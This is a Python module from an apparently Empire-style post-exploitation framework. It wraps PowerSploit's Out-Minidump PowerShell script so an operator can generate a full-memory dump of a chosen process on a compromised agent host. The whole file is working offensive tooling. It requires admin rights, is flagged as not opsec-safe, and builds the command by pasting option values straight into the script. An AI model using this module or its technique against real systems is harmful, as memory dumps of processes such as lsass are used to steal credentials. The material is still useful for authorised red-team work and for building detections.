from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Out-Minidump',

            'Author': ['@mattifestation'],

            'Description': ('Generates a full-memory minidump of a process.'),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ProcessName' : {
                'Description'   :   'Specifies the process name for which a dump will be generated.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcessId' : {
                'Description'   :   'Specifies the process ID for which a dump will be generated.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DumpFilePath' : {
                'Description'   :   'Specifies the folder path where dump files will be written. Defaults to the current user directory.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Out-Minidump.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if option == "ProcessName":
                        script += "Get-Process " + values['Value'] + " | Out-Minidump"
                    elif option == "ProcessId":
                        script += "Get-Process -Id " + values['Value'] + " | Out-Minidump"
        
        for option,values in self.options.iteritems():
            if values['Value'] and values['Value'] != '':
                if option != "Agent" and option != "ProcessName" and option != "ProcessId":
                    script += " -" + str(option) + " " + str(values['Value'])

        return script
